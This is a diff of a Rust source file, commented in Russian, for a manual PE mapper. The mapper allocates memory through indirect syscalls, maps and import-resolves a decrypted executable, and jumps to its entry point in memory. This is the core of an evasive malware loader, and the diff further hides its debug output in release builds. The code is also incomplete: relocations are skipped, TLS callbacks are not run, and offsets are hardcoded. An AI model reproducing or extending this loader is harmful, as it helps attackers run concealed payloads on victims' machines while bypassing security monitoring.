@@ -8,7 +8,7 @@ use winapi::shared::minwindef::HMODULE;
 use winapi::um::processthreadsapi::GetCurrentProcess;
 use crate::syscall::indirect_syscall;
 use crate::syscall::SyscallNumbers;
-use crate::utils::log;
+use crate::log;
 
 pub struct ManualMapper<'a> {
     pe_loader: PELoader<'a>,
@@ -26,7 +26,7 @@ impl<'a> ManualMapper<'a> {
         let syscall_numbers = SyscallNumbers::new()
             .map_err(|e| format!("Failed to get syscall numbers: {}", e))?;
 
-        log("[*] Attempting memory allocation via syscalls...");
+        log!("[*] Attempting memory allocation via syscalls...");
 
         let mut base_address = preferred_base as *mut winapi::ctypes::c_void;
         let mut region_size = image_size as u64;
@@ -44,7 +44,7 @@ impl<'a> ManualMapper<'a> {
         }; // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
 
         let mapped_base = if status != 0 {
-            log(&format!("[WARNING] Syscall failed with status: 0x{:x}, falling back to VirtualAlloc", status));
+            log!("[WARNING] Syscall failed with status: 0x{:x}, falling back to VirtualAlloc", status);
             
             unsafe {
                 winapi::um::memoryapi::VirtualAlloc(
@@ -55,7 +55,7 @@ impl<'a> ManualMapper<'a> {
                 ) as *mut u8
             } // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
         } else {
-            log("[+] Memory allocated successfully via syscalls");
+            log!("[+] Memory allocated successfully via syscalls");
             base_address as *mut u8
         }; // ← ДОБАВЛЕНО: Закрывающая скобка if блока
 
@@ -63,7 +63,7 @@ impl<'a> ManualMapper<'a> {
             return Err("Failed to allocate memory for PE image".to_string());
         } // ← ДОБАВЛЕНО: Закрывающая скобка if блока
 
-        log(&format!("[+] Memory allocated: {} bytes at {:p}", image_size, mapped_base));
+        log!("[+] Memory allocated: {} bytes at {:p}", image_size, mapped_base);
         
         Ok(ManualMapper {
             pe_loader,
@@ -75,18 +75,18 @@ impl<'a> ManualMapper<'a> {
 
     pub fn map_sections(&mut self) -> Result<(), String> {
         let sections = self.pe_loader.get_sections()?;
-        println!("[DEBUG] Mapping {} sections", sections.len());
+        log!("[DEBUG] Mapping {} sections", sections.len());
 
         for section in sections {
             if section.raw_size == 0 {
-                println!("[DEBUG] Skipping empty section: {}", section.name);
+                log!("[DEBUG] Skipping empty section: {}", section.name);
                 continue;
             } // ← ДОБАВЛЕНО: Закрывающая скобка if блока
 
             let dest = unsafe { self.mapped_base.add(section.virtual_address) };
             let src = unsafe { self.pe_loader.get_pe_data().as_ptr().add(section.raw_address) };
 
-            println!("[DEBUG] Mapping section {} from {:p} to {:p} (size: {})", 
+            log!("[DEBUG] Mapping section {} from {:p} to {:p} (size: {})",
                 section.name, src, dest, section.raw_size);
 
             unsafe {
@@ -128,7 +128,7 @@ impl<'a> ManualMapper<'a> {
         }; // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
 
         if status != 0 {
-            log(&format!("[WARNING] Syscall protection failed, falling back to VirtualProtect"));
+            log!("[WARNING] Syscall protection failed, falling back to VirtualProtect");
             
             unsafe {
                 winapi::um::memoryapi::VirtualProtect(
@@ -140,14 +140,14 @@ impl<'a> ManualMapper<'a> {
             } // ← ДОБАВЛЕНО: Закрывающая скобка unsafe блока
         } // ← ДОБАВЛЕНО: Закрывающая скобка if блока
 
-        log(&format!("[+] Section {} protection set: 0x{:X}", section.name, protection));
+        log!("[+] Section {} protection set: 0x{:X}", section.name, protection);
         Ok(())
     } // ← ДОБАВЛЕНО: Закрывающая скобка 
 
 
     /// --- РУЧНОЙ IMPORT RESOLUTION (обходит "Misaligned") ---
     pub fn resolve_imports(&mut self) -> Result<(), String> {
-        println!("[DEBUG] Starting manual import resolution...");
+        log!("[DEBUG] Starting manual import resolution...");
 
         let pe_data = self.pe_loader.get_pe_data().to_vec();
 
@@ -155,15 +155,15 @@ impl<'a> ManualMapper<'a> {
             &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER)
         };
 
-        println!("[DEBUG] DOS Header - e_lfanew: 0x{:X}", dos_header.e_lfanew);
+        log!("[DEBUG] DOS Header - e_lfanew: 0x{:X}", dos_header.e_lfanew);
 
         let nt_headers = unsafe {
             &*((pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS64)
         };
 
-        println!("[DEBUG] NT Headers signature: 0x{:X}", nt_headers.Signature);
-        println!("[DEBUG] Optional Header size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);
-        println!("[DEBUG] Number of RVA and sizes: {}", nt_headers.OptionalHeader.NumberOfRvaAndSizes);
+        log!("[DEBUG] NT Headers signature: 0x{:X}", nt_headers.Signature);
+        log!("[DEBUG] Optional Header size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);
+        log!("[DEBUG] Number of RVA and sizes: {}", nt_headers.OptionalHeader.NumberOfRvaAndSizes);
 
         // ИСПРАВЛЕННЫЙ расчет DataDirectory offset
         let optional_header_offset = dos_header.e_lfanew as usize +
@@ -174,7 +174,7 @@ impl<'a> ManualMapper<'a> {
         // OptionalHeader64 имеет фиксированную структуру, DataDirectory начинается с offset 112
         let data_directory_offset = optional_header_offset + 112;
 
-        println!("[DEBUG] Corrected DataDirectory offset: 0x{:X}", data_directory_offset);
+        log!("[DEBUG] Corrected DataDirectory offset: 0x{:X}", data_directory_offset);
 
         // Читаем Import Directory (INDEX 1)
         let import_dir_offset = data_directory_offset + 1 * 8; // Каждый entry = 8 bytes (VA + Size)
@@ -185,7 +185,7 @@ impl<'a> ManualMapper<'a> {
             *((pe_data.as_ptr() as usize + import_dir_offset + 4) as *const u32)
         };
 
-        println!("[DEBUG] Corrected Import Directory: VirtualAddress=0x{:X}, Size={}", import_dir_va, import_dir_size);
+        log!("[DEBUG] Corrected Import Directory: VirtualAddress=0x{:X}, Size={}", import_dir_va, import_dir_size);
 
         // НОВАЯ ДИАГНОСТИКА: Проверяем Delayed Import Directory
         let delayed_import_offset = data_directory_offset + 13 * 8; // INDEX 13 = DELAYED_IMPORT_DESCRIPTOR
@@ -195,40 +195,43 @@ impl<'a> ManualMapper<'a> {
         let delayed_import_size = unsafe {
             *((pe_data.as_ptr() as usize + delayed_import_offset + 4) as *const u32)
         };
-        println!("[DEBUG] Delayed Import Directory: VirtualAddress=0x{:X}, Size={}", delayed_import_va, delayed_import_size);
+        log!("[DEBUG] Delayed Import Directory: VirtualAddress=0x{:X}, Size={}", delayed_import_va, delayed_import_size);
 
         // НОВАЯ ДИАГНОСТИКА: Проверяем содержимое .idata секции
-        println!("[DEBUG] Checking .idata section content:");
+        log!("[DEBUG] Checking .idata section content:");
         let idata_ptr = unsafe { self.mapped_base.add(0x28000) }; // Из лога: .idata at 0x28000
         for i in 0..16 {
             let value = unsafe { *((idata_ptr as usize + i * 4) as *const u32) };
-            println!("[DEBUG] .idata[{}]: 0x{:X}", i, value);
+            log!("[DEBUG] .idata[{}]: 0x{:X}", i, value);
         }
 
         // НОВАЯ ДИАГНОСТИКА: Dump первых байтов PE для проверки целостности
-        println!("[DEBUG] First 32 bytes of decrypted PE:");
-        for i in 0..32 {
-            print!("{:02X} ", pe_data[i]);
-            if (i + 1) % 16 == 0 { println!(); }
+        #[cfg(debug_assertions)]
+        {
+            log!("[DEBUG] First 32 bytes of decrypted PE:");
+            for i in 0..32 {
+                print!("{:02X} ", pe_data[i]);
+                if (i + 1) % 16 == 0 { log!(); }
+            }
         }
 
         // Если обычные импорты отсутствуют, пробуем альтернативные варианты
         if import_dir_va == 0 || import_dir_size == 0 {
             if delayed_import_va != 0 && delayed_import_size > 0 {
-                println!("[DEBUG] Found delayed imports, processing...");
+            log!("[DEBUG] Found delayed imports, processing...");
                 return self.process_delayed_imports(&pe_data, delayed_import_va);
             } else {
                 // АЛЬТЕРНАТИВНЫЙ ПОИСК: Ищем Import Descriptors прямо в .idata
-                println!("[DEBUG] Trying direct search in .idata section...");
+                log!("[DEBUG] Trying direct search in .idata section...");
                 let idata_rva = 0x28000; // Из лога видно что .idata начинается с 0x28000
-                println!("[DEBUG] Searching for Import Descriptors in .idata at RVA 0x{:X}", idata_rva);
+                log!("[DEBUG] Searching for Import Descriptors in .idata at RVA 0x{:X}", idata_rva);
                 
                 // Пробуем найти импорты напрямую в .idata
                 match self.collect_import_descriptors(&pe_data, idata_rva) {
                     Ok(descriptors) if !descriptors.is_empty() => {
-                        println!("[DEBUG] Found {} import descriptors in .idata", descriptors.len());
+                        log!("[DEBUG] Found {} import descriptors in .idata", descriptors.len());
                         for (dll_name_str, import_desc) in descriptors {
-                            println!("[DEBUG] Loading DLL: {}", dll_name_str);
+                            log!("[DEBUG] Loading DLL: {}", dll_name_str);
 
                             let dll_name_c = CString::new(dll_name_str.clone())
                                 .map_err(|e| format!("CString error: {}", e))?;
@@ -236,16 +239,16 @@ impl<'a> ManualMapper<'a> {
                             if h_module.is_null() {
                                 return Err(format!("Failed to load library: {}", dll_name_str));
                             }
-                            println!("[DEBUG] Successfully loaded {}", dll_name_str);
+                            log!("[DEBUG] Successfully loaded {}", dll_name_str);
 
                             self.resolve_dll_imports(&pe_data, &import_desc, h_module, &dll_name_str)?;
                         }
-                        println!("[DEBUG] Import resolution completed successfully");
+                        log!("[DEBUG] Import resolution completed successfully");
                         return Ok(());
                     }
                     _ => {
-                        println!("[DEBUG] No imports found (neither standard nor delayed)");
-                        println!("[WARNING] PE may be statically linked or corrupted");
+                        log!("[DEBUG] No imports found (neither standard nor delayed)");
+                        log!("[WARNING] PE may be statically linked or corrupted");
                         return Ok(());
                     }
                 }
@@ -255,7 +258,7 @@ impl<'a> ManualMapper<'a> {
         let import_descriptors = self.collect_import_descriptors(&pe_data, import_dir_va)?;
 
         for (dll_name_str, import_desc) in import_descriptors {
-            println!("[DEBUG] Loading DLL: {}", dll_name_str);
+            log!("[DEBUG] Loading DLL: {}", dll_name_str);
 
             let dll_name_c = CString::new(dll_name_str.clone())
                 .map_err(|e| format!("CString error: {}", e))?;
@@ -263,63 +266,63 @@ impl<'a> ManualMapper<'a> {
             if h_module.is_null() {
                 return Err(format!("Failed to load library: {}", dll_name_str));
             }
-            println!("[DEBUG] Successfully loaded {}", dll_name_str);
+            log!("[DEBUG] Successfully loaded {}", dll_name_str);
 
             self.resolve_dll_imports(&pe_data, &import_desc, h_module, &dll_name_str)?;
         }
 
-        println!("[DEBUG] Import resolution completed successfully");
+        log!("[DEBUG] Import resolution completed successfully");
         Ok(())
     }
 
     // НОВАЯ ФУНКЦИЯ: Обработка delayed imports
     fn process_delayed_imports(&mut self, _pe_data: &[u8], _delayed_import_va: u32) -> Result<(), String> {
-        println!("[DEBUG] Processing delayed imports...");
+        log!("[DEBUG] Processing delayed imports...");
         Ok(())
     }
 
     fn collect_import_descriptors(&self, pe_data: &[u8], import_dir_rva: u32) -> Result<Vec<(String, IMAGE_IMPORT_DESCRIPTOR)>, String> {
-        println!("[DEBUG] collect_import_descriptors: Starting with RVA 0x{:X}", import_dir_rva);
+        log!("[DEBUG] collect_import_descriptors: Starting with RVA 0x{:X}", import_dir_rva);
         
         let mut descriptors = Vec::new();
         
-        println!("[DEBUG] Converting RVA to file offset...");
+        log!("[DEBUG] Converting RVA to file offset...");
         let import_table_offset = self.rva_to_file_offset(import_dir_rva, pe_data)?;
-        println!("[DEBUG] Import table file offset: 0x{:X}", import_table_offset);
+        log!("[DEBUG] Import table file offset: 0x{:X}", import_table_offset);
         
         let mut offset = import_table_offset;
         let mut descriptor_count = 0;
 
-        println!("[DEBUG] Starting to read Import Descriptors...");
+        log!("[DEBUG] Starting to read Import Descriptors...");
 
         // Безопасный цикл с проверками границ
         while offset + std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>() <= pe_data.len() {
-            println!("[DEBUG] Reading descriptor #{} at offset 0x{:X}", descriptor_count, offset);
+            log!("[DEBUG] Reading descriptor #{} at offset 0x{:X}", descriptor_count, offset);
             
             // Безопасное чтение Import Descriptor
             let import_desc = unsafe {
                 &*(pe_data.as_ptr().add(offset) as *const IMAGE_IMPORT_DESCRIPTOR)
             };
 
-            println!("[DEBUG] Import descriptor #{}: Name=0x{:X}, FirstThunk=0x{:X}, OriginalFirstThunk=0x{:X}", 
+            log!("[DEBUG] Import descriptor #{}: Name=0x{:X}, FirstThunk=0x{:X}, OriginalFirstThunk=0x{:X}",
                 descriptor_count, import_desc.Name, import_desc.FirstThunk, import_desc.OriginalFirstThunk);
 
             // Конец таблицы импортов
             if import_desc.Name == 0 {
-                println!("[DEBUG] End of import descriptors (Name=0)");
+                log!("[DEBUG] End of import descriptors (Name=0)");
                 break;
             }
 
-            println!("[DEBUG] Converting DLL name RVA 0x{:X} to file offset...", import_desc.Name);
+            log!("[DEBUG] Converting DLL name RVA 0x{:X} to file offset...", import_desc.Name);
             let dll_name_offset = self.rva_to_file_offset(import_desc.Name, pe_data)?;
-            println!("[DEBUG] DLL name file offset: 0x{:X}", dll_name_offset);
+            log!("[DEBUG] DLL name file offset: 0x{:X}", dll_name_offset);
 
             // Проверка границ для имени DLL
             if dll_name_offset >= pe_data.len() {
                 return Err(format!("DLL name offset out of bounds: 0x{:X} (file size: {})", dll_name_offset, pe_data.len()));
             }
 
-            println!("[DEBUG] Reading DLL name at offset 0x{:X}", dll_name_offset);
+            log!("[DEBUG] Reading DLL name at offset 0x{:X}", dll_name_offset);
             
             // Безопасное чтение имени DLL
             let dll_name_cstr = unsafe {
@@ -330,7 +333,7 @@ impl<'a> ManualMapper<'a> {
                 .map_err(|e| format!("Invalid DLL name encoding: {:?}", e))?
                 .to_string();
 
-            println!("[DEBUG] Found DLL: {}", dll_name_str);
+            log!("[DEBUG] Found DLL: {}", dll_name_str);
 
             // Копируем структуру (не ссылку)
             descriptors.push((dll_name_str, *import_desc));
@@ -346,15 +349,15 @@ impl<'a> ManualMapper<'a> {
 
         // Проверка на выход из цикла по границам
         if offset + std::mem::size_of::<IMAGE_IMPORT_DESCRIPTOR>() > pe_data.len() {
-            println!("[DEBUG] Reached end of file while reading import descriptors");
+            log!("[DEBUG] Reached end of file while reading import descriptors");
         }
 
-        println!("[DEBUG] Found {} import descriptors total", descriptors.len());
+        log!("[DEBUG] Found {} import descriptors total", descriptors.len());
         Ok(descriptors)
     }
 
     fn rva_to_file_offset(&self, rva: u32, pe_data: &[u8]) -> Result<usize, String> {
-        println!("[DEBUG] rva_to_file_offset: Converting RVA 0x{:X}, file size: {}", rva, pe_data.len());
+        log!("[DEBUG] rva_to_file_offset: Converting RVA 0x{:X}, file size: {}", rva, pe_data.len());
         
         let dos_header = unsafe { 
             &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) 
@@ -371,8 +374,8 @@ impl<'a> ManualMapper<'a> {
 
         let num_sections = nt_headers.FileHeader.NumberOfSections as usize;
 
-        println!("[DEBUG] Number of sections: {}, section headers start at: 0x{:X}", num_sections, section_headers_offset);
-        println!("[DEBUG] OptionalHeader size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);
+        log!("[DEBUG] Number of sections: {}, section headers start at: 0x{:X}", num_sections, section_headers_offset);
+        log!("[DEBUG] OptionalHeader size: {}", nt_headers.FileHeader.SizeOfOptionalHeader);
 
         for i in 0..num_sections {
             let section_header_offset = section_headers_offset + i * 40; // sizeof(IMAGE_SECTION_HEADER)
@@ -394,8 +397,8 @@ impl<'a> ManualMapper<'a> {
                 std::str::from_utf8(&name_bytes[..name_len]).unwrap_or("???")
             };
 
-            println!("[DEBUG] Section {}: {} - VirtualAddress=0x{:X}, VirtualSize=0x{:X}, PointerToRawData=0x{:X}, SizeOfRawData=0x{:X}", 
-                i, section_name, section_header.VirtualAddress, virtual_size, 
+            log!("[DEBUG] Section {}: {} - VirtualAddress=0x{:X}, VirtualSize=0x{:X}, PointerToRawData=0x{:X}, SizeOfRawData=0x{:X}",
+                i, section_name, section_header.VirtualAddress, virtual_size,
                 section_header.PointerToRawData, section_header.SizeOfRawData);
 
             if rva >= section_header.VirtualAddress && 
@@ -403,7 +406,7 @@ impl<'a> ManualMapper<'a> {
                 let offset_in_section = rva - section_header.VirtualAddress;
                 let file_offset = section_header.PointerToRawData as usize + offset_in_section as usize;
                 
-                println!("[DEBUG] Found RVA 0x{:X} in section {}: offset_in_section=0x{:X}, file_offset=0x{:X}", 
+                log!("[DEBUG] Found RVA 0x{:X} in section {}: offset_in_section=0x{:X}, file_offset=0x{:X}",
                     rva, section_name, offset_in_section, file_offset);
                     
                 if file_offset >= pe_data.len() {
@@ -428,7 +431,7 @@ impl<'a> ManualMapper<'a> {
 
         let iat_rva = import_desc.FirstThunk;
 
-        println!("[DEBUG] INT RVA: 0x{:X}, IAT RVA: 0x{:X}", int_rva, iat_rva);
+        log!("[DEBUG] INT RVA: 0x{:X}, IAT RVA: 0x{:X}", int_rva, iat_rva);
 
         let int_offset = self.rva_to_file_offset(int_rva, pe_data)?;
         let mut thunk_offset = 0usize;
@@ -438,7 +441,7 @@ impl<'a> ManualMapper<'a> {
             let thunk_addr = int_offset + thunk_offset;
         
             if thunk_addr + 8 > pe_data.len() {
-                println!("[DEBUG] Reached end of thunks");
+                log!("[DEBUG] Reached end of thunks");
                 break;
             }
 
@@ -447,11 +450,11 @@ impl<'a> ManualMapper<'a> {
             thunk_bytes.copy_from_slice(&pe_data[thunk_addr..thunk_addr + 8]);
             let thunk_data = u64::from_le_bytes(thunk_bytes);
 
-            println!("[DEBUG] Thunk #{}: data=0x{:X} at offset=0x{:X}", 
+            log!("[DEBUG] Thunk #{}: data=0x{:X} at offset=0x{:X}",
                 thunk_offset / 8, thunk_data, thunk_addr);
 
             if thunk_data == 0 {
-                println!("[DEBUG] End of imports (thunk_data=0)");
+                log!("[DEBUG] End of imports (thunk_data=0)");
                 break;
             }
 
@@ -465,7 +468,7 @@ impl<'a> ManualMapper<'a> {
                 let func_name_str = func_name.to_str()
                     .map_err(|_| format!("Invalid function name in {}", dll_name))?;
 
-                println!("[DEBUG] Resolving function: {}", func_name_str);
+                log!("[DEBUG] Resolving function: {}", func_name_str);
 
                 let func_name_c = CString::new(func_name_str)
                     .map_err(|e| format!("CString error: {}", e))?;
@@ -478,7 +481,7 @@ impl<'a> ManualMapper<'a> {
                 let iat_address = (iat_rva + (thunk_offset as u32)) as usize;
                 let iat_ptr = unsafe { self.mapped_base.add(iat_address) as *mut usize };
 
-                println!("[DEBUG] Writing function address {:p} to IAT at mapped address {:p} (RVA 0x{:X})", 
+                log!("[DEBUG] Writing function address {:p} to IAT at mapped address {:p} (RVA 0x{:X})",
                     func_addr, iat_ptr, iat_rva + (thunk_offset as u32));
 
                 // Безопасная запись через write_unaligned (не требует выравнивания)
@@ -486,10 +489,10 @@ impl<'a> ManualMapper<'a> {
                     write_unaligned(iat_ptr, func_addr as usize);
                 }
 
-                println!("[DEBUG] Resolved {} -> {:p}, written to IAT successfully", 
+                log!("[DEBUG] Resolved {} -> {:p}, written to IAT successfully",
                     func_name_str, func_addr);
             } else {
-                println!("[DEBUG] Skipping ordinal import: 0x{:X}", thunk_data);
+                log!("[DEBUG] Skipping ordinal import: 0x{:X}", thunk_data);
             }
 
             thunk_offset += 8;
@@ -501,21 +504,21 @@ impl<'a> ManualMapper<'a> {
     // НОВАЯ ФУНКЦИЯ: Обработка релокаций
     #[allow(dead_code)]
     fn process_relocations(&self, preferred_base: u64, actual_base: u64) -> Result<(), String> {
-        println!("[DEBUG] Processing relocations...");
-        
+        log!("[DEBUG] Processing relocations...");
+
         let delta = actual_base as i64 - preferred_base as i64;
-        println!("[DEBUG] Relocation delta: 0x{:X}", delta);
-        
+        log!("[DEBUG] Relocation delta: 0x{:X}", delta);
+
         // БЕЗОПАСНЫЙ ПОДХОД: Пропускаем релокации для первого теста
-        println!("[DEBUG] Relocation processing skipped - testing without relocations");
-        println!("[WARNING] PE may crash due to incorrect absolute addresses");
+        log!("[DEBUG] Relocation processing skipped - testing without relocations");
+        log!("[WARNING] PE may crash due to incorrect absolute addresses");
         
         Ok(())
     }
 
     // НОВАЯ ФУНКЦИЯ: Инициализация TLS
     fn initialize_tls(&self) -> Result<(), String> {
-        println!("[DEBUG] Initializing TLS callbacks...");
+        log!("[DEBUG] Initializing TLS callbacks...");
     
         let pe_data = self.pe_loader.get_pe_data();
         let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
@@ -532,25 +535,25 @@ impl<'a> ManualMapper<'a> {
             return Ok(());
         }
     
-        println!("[DEBUG] TLS Directory at RVA 0x{:X}", tls_dir_va);
+        log!("[DEBUG] TLS Directory at RVA 0x{:X}", tls_dir_va);
     
         // КРИТИЧНО: Пытаемся найти и вызвать TLS callbacks
         let tls_file_offset = match self.rva_to_file_offset(tls_dir_va, pe_data) {
             Ok(offset) => offset,
             Err(e) => {
-                println!("[WARNING] Failed to convert TLS RVA to file offset: {}", e);
+                log!("[WARNING] Failed to convert TLS RVA to file offset: {}", e);
                 return Ok(());
             }
         };
     
-        println!("[DEBUG] TLS file offset: 0x{:X}", tls_file_offset);
+        log!("[DEBUG] TLS file offset: 0x{:X}", tls_file_offset);
     
         // Простая TLS инициализация - читаем TLS directory
         if tls_file_offset + 24 <= pe_data.len() { // Минимальный размер TLS directory
-            println!("[DEBUG] TLS directory accessible, attempting basic initialization");
-        
+            log!("[DEBUG] TLS directory accessible, attempting basic initialization");
+
             // Для безопасности - просто логируем что TLS есть, но не вызываем callbacks
-            println!("[DEBUG] TLS callbacks present but not executed (may cause issues)");
+            log!("[DEBUG] TLS callbacks present but not executed (may cause issues)");
         }
     
         Ok(())
@@ -566,61 +569,64 @@ impl<'a> ManualMapper<'a> {
         let preferred_base = nt_headers.OptionalHeader.ImageBase;
         let actual_base = self.mapped_base as u64;
 
-        println!("[DEBUG] PE preferred base: 0x{:X}", preferred_base);
-        println!("[DEBUG] PE actual base: 0x{:X}", actual_base);
+        log!("[DEBUG] PE preferred base: 0x{:X}", preferred_base);
+        log!("[DEBUG] PE actual base: 0x{:X}", actual_base);
 
         if preferred_base != actual_base {
-            println!("[WARNING] Base address mismatch! Delta: 0x{:X}", (actual_base as i64 - preferred_base as i64));
-            println!("[DEBUG] Attempting execution without relocations...");
+            log!("[WARNING] Base address mismatch! Delta: 0x{:X}", (actual_base as i64 - preferred_base as i64));
+            log!("[DEBUG] Attempting execution without relocations...");
         }
 
         let entry_point = unsafe {
             self.mapped_base.add(self.pe_loader.get_entry_point())
         };
 
-        println!("[DEBUG] Entry point calculated: {:p}", entry_point);
-        println!("[DEBUG] Entry point offset: 0x{:X}", self.pe_loader.get_entry_point());
+        log!("[DEBUG] Entry point calculated: {:p}", entry_point);
+        log!("[DEBUG] Entry point offset: 0x{:X}", self.pe_loader.get_entry_point());
 
         // Детальная проверка entry point
         let entry_bytes = unsafe { std::slice::from_raw_parts(entry_point, 32) };
-        print!("[DEBUG] Entry point bytes (32): ");
-        for (i, byte) in entry_bytes.iter().enumerate() {
-            print!("{:02X} ", byte);
-            if (i + 1) % 16 == 0 { println!(); }
+        #[cfg(debug_assertions)]
+        {
+            print!("[DEBUG] Entry point bytes (32): ");
+            for (i, byte) in entry_bytes.iter().enumerate() {
+                print!("{:02X} ", byte);
+                if (i + 1) % 16 == 0 { log!(); }
+            }
+            if entry_bytes.len() % 16 != 0 { log!(); }
         }
-        if entry_bytes.len() % 16 != 0 { println!(); }
 
         // Проверяем память перед выполнением
-        println!("[DEBUG] Checking memory accessibility...");
+        log!("[DEBUG] Checking memory accessibility...");
         let test_read = unsafe { std::ptr::read_volatile(entry_point) };
-        println!("[DEBUG] Entry point accessible, first byte: 0x{:02X}", test_read);
+        log!("[DEBUG] Entry point accessible, first byte: 0x{:02X}", test_read);
 
         // НОВОЕ: Инициализация TLS callbacks перед entry point
         if let Err(e) = self.initialize_tls() {
-            println!("[WARNING] TLS initialization failed: {}", e);
+            log!("[WARNING] TLS initialization failed: {}", e);
         }
 
-        log("[*] Executing PE at address via syscall-allocated memory");
+        log!("[*] Executing PE at address via syscall-allocated memory");
 
         // КРИТИЧНО: Устанавливаем exception handler
         let result = std::panic::catch_unwind(|| {
             unsafe {
                 let entry_fn: extern "system" fn() -> u32 = std::mem::transmute(entry_point);
             
-                println!("[DEBUG] About to call entry point...");
+                log!("[DEBUG] About to call entry point...");
                 let exit_code = entry_fn();
-                println!("[*] PE execution completed with exit code: {}", exit_code);
+                log!("[*] PE execution completed with exit code: {}", exit_code);
                 exit_code
             }
         });
 
         match result {
             Ok(exit_code) => {
-                log(&format!("[SUCCESS] PE executed successfully with code: {}", exit_code));
+                log!("[SUCCESS] PE executed successfully with code: {}", exit_code);
             }
             Err(_) => {
-                println!("[ERROR] PE execution crashed with access violation!");
-                println!("[ERROR] This indicates incorrect absolute addresses - relocations needed");
+                log!("[ERROR] PE execution crashed with access violation!");
+                log!("[ERROR] This indicates incorrect absolute addresses - relocations needed");
                 return Err("PE execution failed due to access violation".to_string());
             }
         }
